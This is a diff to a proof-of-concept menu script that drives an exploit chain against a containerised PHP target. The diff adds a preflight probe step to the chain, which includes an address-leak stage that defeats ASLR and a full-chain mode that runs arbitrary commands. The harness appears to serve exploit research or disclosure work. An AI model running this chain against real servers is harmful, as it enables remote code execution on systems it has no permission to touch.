@@ -9,6 +9,8 @@
 #   3  full chain with a custom command
 #   4  disclosure only, ASLR check (no execution stage)
 #
+# The full-chain actions go through chain.sh, so preflight and the arming gate run for them too.
+#
 # Interactive by default; `poc_menu.sh <number>` runs one action and exits, which is also how the
 # script is exercised in CI-like checks.
 set -u
@@ -57,7 +59,7 @@ full_chain() {
   # $1: --single or "" | $2: command | $3: proof path | $4: workers
   local mode="$1" cmd="$2" proof="$3" workers="$4"
   fresh_target $mode
-  local args=(--target "$TARGET" --container "$CONTAINER" --cmd "$cmd" --proof "$proof")
+  local args=(--target "$TARGET" --container "$CONTAINER" --probe /probe.php --cmd "$cmd" --proof "$proof")
   [ "$workers" -gt 1 ] && args+=(--workers "$workers")
   echo "[*] chain: A1 -> B1 -> addresses -> A2 -> B2"
   # No filtering here: chain.sh already trims its own output, and the proof is whatever command we
@@ -94,6 +96,10 @@ action_4() {
   cookie=$(mktemp)
   for ((i = 1; i <= LOOPS; i++)); do
     fresh_target "$SINGLE_TAG" >/dev/null
+    if [ "$i" = 1 ]; then
+      python3 poc/preflight.py --url "$TARGET" --probe /probe.php \
+        || { echo "[!] preflight failed for this container" >&2; rm -f "$cookie"; return 1; }
+    fi
     if bases=$(arm_and_leak "$cookie" | grep -E '^LIBPHP=|^CHUNK=|^MAIN=|^S=|^HSV='); then
       echo "  run$i $(echo "$bases" | tr '\n' ' ')"
     else
